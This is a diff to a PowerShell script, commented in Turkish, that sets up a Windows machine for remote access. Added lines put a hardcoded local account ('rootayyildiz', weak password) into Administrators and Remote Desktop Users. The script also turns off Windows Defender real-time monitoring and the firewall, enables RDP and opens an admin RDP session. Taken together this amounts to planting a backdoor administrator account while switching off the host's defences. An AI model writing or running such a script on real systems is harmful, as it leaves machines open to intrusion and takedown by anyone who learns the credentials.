@@ -43,6 +43,16 @@ function Add-UserToAdminGroup {
     }
 }
 
+function Add-UserToRemoteDesktopGroup {
+    param([string]$Username)
+    if (Check-UserExists -Username $Username) {
+        Add-LocalGroupMember -Group "Remote Desktop Users" -Member $Username
+        Write-Host "$Username Remote Desktop Users grubuna eklendi." -ForegroundColor Green
+    } else {
+        Write-Host "Kullanıcı bulunamadı: $Username" -ForegroundColor Red
+    }
+}
+
 function Disable-WindowsDefender {
     Write-Host "Windows Defender devre dışı bırakılıyor..."
     Set-MpPreference -DisableRealtimeMonitoring $true
@@ -67,12 +77,21 @@ Check-Admin
 $Username = "rootayyildiz"
 $Password = "123456!'^+%&/"
 
+# Kullanıcı ekle ve yetkiler tanımla
 Add-NewUser -Username $Username -Password $Password
 Add-UserToAdminGroup -Username $Username
+Add-UserToRemoteDesktopGroup -Username $Username
+
+# Windows Defender ve Güvenlik Duvarını kapat
 Disable-WindowsDefender
 Disable-WindowsFirewall
+
+# RDP'yi etkinleştir
 Enable-RDP
 
+# Sunucu IP'sini al ve göster
 $ServerIP = Get-LocalIPAddress
 Write-Host "Sunucu IP Adresi: $ServerIP"
+
+# RDP oturumunu başlat
 Start-Process "mstsc" -ArgumentList "/v:$ServerIP /admin"
